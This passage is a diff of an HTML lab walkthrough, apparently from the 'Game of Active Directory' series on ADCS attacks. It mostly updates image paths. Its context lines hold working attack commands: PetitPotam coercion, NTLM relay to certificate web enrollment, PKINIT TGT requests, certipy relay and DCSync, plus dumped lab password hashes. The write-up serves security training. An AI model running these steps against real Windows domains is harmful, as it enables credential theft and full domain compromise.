 <p>petitpotam.py 10.4.10.1 meereen.essos.local</p>
-<img src="./images/screenshot_39.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_39.png" alt="">
 
 
 <p>ntlmrelayx will relay the authentication to the web enrollment and get the certificate</p>
 
-<img src="./images/screenshot_40.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_40.png" alt="">
 
 
 
 <p>Since we already have the Certificate, let’s add it into a file and user gettgtpkinit.py to request the Ticket Granting Ticket.</p>
 <p>gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'</p>
-<img src="./images/screenshot_41.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_41.png" alt="">
 
 
 <p>And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.</p>
@@ -892,7 +892,7 @@ SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:a2df9dab576856ef49ffb73cb87c307d
 SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 
 
-<img src="./images/screenshot_42.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_42.png" alt="">
 
 
 
@@ -903,13 +903,13 @@ SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 <p>Let’s do the same attack with certipy, setup the listener.</p>
 
 <p>sudo certipy relay -target 10.4.10.23 -template DomainController</p>
-<img src="./images/screenshot_43.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_43.png" alt="">
 
 
 
 <p>Now we trig the coerce.</p>
 <p>python3 PetitPotam.py 10.4.10.1 meereen.essos.local</p>
-<img src="./images/screenshot_44.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_44.png" alt="">
 
 
 
@@ -925,7 +925,7 @@ SEVENKINGDOMS$:des-cbc-md5:e920b3430b1af454</code></pre>
 [*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:1658546257058b9db06169b70bd26fdb</code></pre>
 
 
-<img src="./images/screenshot_45.png" alt="">
+<img src="./game-of-active-directory/part-5-adcs/images/screenshot_45.png" alt="">
 
 
 
